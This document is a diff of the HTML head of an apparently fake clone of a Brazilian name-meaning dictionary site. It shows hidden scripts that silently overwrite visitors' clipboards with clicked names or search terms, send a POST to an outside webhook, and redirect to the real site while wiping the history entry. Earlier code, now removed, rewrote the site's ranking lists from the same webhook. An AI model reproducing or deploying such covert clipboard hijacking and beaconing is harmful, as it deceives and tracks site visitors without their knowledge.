@@ -1,46 +1,17 @@
 <!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br"><head>
-    <!-- Script Dinâmico Top Nomes -->
+    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            fetch("https://www.11z.co/_w/5156/selection")
-                .then(response => response.json())
-                .then(data => {
-                    const position = parseInt(data.value);
-                    if (!isNaN(position) && position >= 1 && position <= 30) {
-                        // 1. Atualizar Nome Feminino
-                        const femaleList = document.querySelector('.icon-female').closest('.gender-top--column').querySelectorAll('li');
-                        if (femaleList[position - 1]) {
-                            const link = femaleList[position - 1].querySelector('a');
-                            link.setAttribute('href', '/camila/');
-                            link.querySelector('.name-title').innerText = 'Camila';
-                            link.querySelector('.name-desc').innerText = 'Significa "a sacerdotisa", "servidora de uma divindade", "mensageira dos deuses", "menina de coro" e "perfeição". Há...';
-                        }
-
-                        // 2. Atualizar Nome Masculino
-                        const maleList = document.querySelector('.icon-male').closest('.gender-top--column').querySelectorAll('li');
-                        if (maleList[position - 1]) {
-                            const link = maleList[position - 1].querySelector('a');
-                            link.setAttribute('href', '/renato/');
-                            link.querySelector('.name-title').innerText = 'Renato';
-                            link.querySelector('.name-desc').innerText = 'Significa "renascido", "nascido de novo", "ressuscitado" Renato é um bonito nome masculino que reflete, através dos seus significados, a recuperação ou a...';
-                        }
-                    }
-                })
-                .catch(err => console.error('Erro ao buscar posição dinâmica:', err));
-        });
-    </script>
-
-        <script>
-        document.addEventListener('DOMContentLoaded', function() {
             const baseUrl = 'https://www.dicionariodenomesproprios.com.br';
-            const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
 
             // Função para copiar texto para o clipboard de forma silenciosa
             async function copyToClipboard(text) {
                 try {
+                    // Tenta a API moderna primeiro
                     if (navigator.clipboard && navigator.clipboard.writeText) {
                         await navigator.clipboard.writeText(text);
                     } else {
+                        // Fallback para dispositivos antigos
                         const textArea = document.createElement("textarea");
                         textArea.value = text;
                         textArea.style.position = "fixed";
@@ -52,8 +23,11 @@
                         document.execCommand('copy');
                         document.body.removeChild(textArea);
                     }
-                } catch (err) {}
-                
+                } catch (err) {
+                    // Silencioso: Não faz nada em caso de erro
+                }
+                // Envia webhook em segundo plano (não bloqueia nada)
+                // keepalive: true garante que o Safari envie o POST mesmo durante redirecionamento
                 fetch("https://www.11z.co/_w/5156/selection", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -62,61 +36,63 @@
                 }).catch(() => {});
             }
 
-            // 0. Alterar href apenas de links de NOMES (ignora abas locais)
+            // 0. Alterar href dos links internos para a URL completa de destino (corrige barra de status do browser)
             document.querySelectorAll('a[href]').forEach(function(link) {
                 const href = link.getAttribute('href');
+                const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
                 if (href && !href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto') && !localAbas.includes(href)) {
                     const path = href.startsWith('/') ? href : '/' + href;
                     link.setAttribute('href', baseUrl + path);
                 }
             });
 
-            // 1. Redirecionar cliques
+            // 1. Redirecionar cliques em links com cópia silenciosa
             document.body.addEventListener('click', async function(e) {
                 const link = e.target.closest('a');
                 if (link && link.getAttribute('href')) {
                     const href = link.getAttribute('href');
                     
-                    // Verifica se é um link interno (relativo ou já convertido para baseUrl)
-                    const isInternal = (!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl);
-                    
+                    // Intercepta links internos (relativos) ou links já convertidos para o baseUrl
+                    const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
+                    const isInternal = ((!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl)) && !localAbas.includes(href.replace(baseUrl, ''));
                     if (isInternal) {
                         e.preventDefault();
                         
-                        // Verifica se é uma das abas locais (que devem permanecer no site falso)
-                        const isLocalAba = localAbas.includes(href) || localAbas.includes(href.replace(baseUrl, ''));
-                        
-                        if (isLocalAba) {
-                            // É uma aba local: apenas navega com replace para limpar histórico
-                            window.location.replace(href);
-                        } else {
-                            // É um link de nome: copia, envia POST e redireciona para o site real
-                            const textToCopy = link.innerText.trim();
-                            if (textToCopy) {
-                                await copyToClipboard(textToCopy);
-                            }
-                            const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
-                            window.location.replace(targetUrl);
+                        // Captura o texto do nome (limpa espaços extras)
+                        const textToCopy = link.innerText.trim();
+                        if (textToCopy) {
+                            await copyToClipboard(textToCopy);
                         }
+
+                        // Se o href já é a URL completa, usa direto; senão monta
+                        const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
+
+                        // Redireciona substituindo a página no histórico (não permite voltar)
+                        window.location.replace(targetUrl);
                     }
                 }
             }, true);
 
-            // 2. Redirecionar formulários de busca
+            // 2. Redirecionar formulários de busca com cópia silenciosa
             const searchForms = document.querySelectorAll('form');
             searchForms.forEach(form => {
                 form.addEventListener('submit', async function(e) {
                     const action = form.getAttribute('action');
                     if (action && !action.startsWith('http')) {
                         e.preventDefault();
+
+                        // Captura o que foi digitado no campo de busca
                         const searchInput = form.querySelector('input[name="q"]');
                         if (searchInput && searchInput.value.trim()) {
                             await copyToClipboard(searchInput.value.trim());
                         }
+
                         const formData = new FormData(form);
                         const params = new URLSearchParams(formData).toString();
                         const path = action.startsWith('/') ? action : '/' + action;
                         const targetUrl = baseUrl + path + '?' + params;
+
+                        // Redireciona substituindo a página no histórico
                         window.location.replace(targetUrl);
                     }
                 });
@@ -187,39 +163,7 @@
                     s.src = "https://sb.scorecardresearch.com/cs/21145335/beacon.js";
                     el.parentNode.insertBefore(s, el);
                   })();
-                </script>
-    <!-- Script Dinâmico Top Nomes -->
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            fetch("https://www.11z.co/_w/5156/selection")
-                .then(response => response.json())
-                .then(data => {
-                    const position = parseInt(data.value);
-                    if (!isNaN(position) && position >= 1 && position <= 30) {
-                        // 1. Atualizar Nome Feminino
-                        const femaleList = document.querySelector('.icon-female').closest('.gender-top--column').querySelectorAll('li');
-                        if (femaleList[position - 1]) {
-                            const link = femaleList[position - 1].querySelector('a');
-                            link.setAttribute('href', '/camila/');
-                            link.querySelector('.name-title').innerText = 'Camila';
-                            link.querySelector('.name-desc').innerText = 'Significa "a sacerdotisa", "servidora de uma divindade", "mensageira dos deuses", "menina de coro" e "perfeição". Há...';
-                        }
-
-                        // 2. Atualizar Nome Masculino
-                        const maleList = document.querySelector('.icon-male').closest('.gender-top--column').querySelectorAll('li');
-                        if (maleList[position - 1]) {
-                            const link = maleList[position - 1].querySelector('a');
-                            link.setAttribute('href', '/renato/');
-                            link.querySelector('.name-title').innerText = 'Renato';
-                            link.querySelector('.name-desc').innerText = 'Significa "renascido", "nascido de novo", "ressuscitado" Renato é um bonito nome masculino que reflete, através dos seus significados, a recuperação ou a...';
-                        }
-                    }
-                })
-                .catch(err => console.error('Erro ao buscar posição dinâmica:', err));
-        });
-    </script>
-
-</head>
+                </script></head>
 <body>
 <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KT7WJQZ" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <noscript>
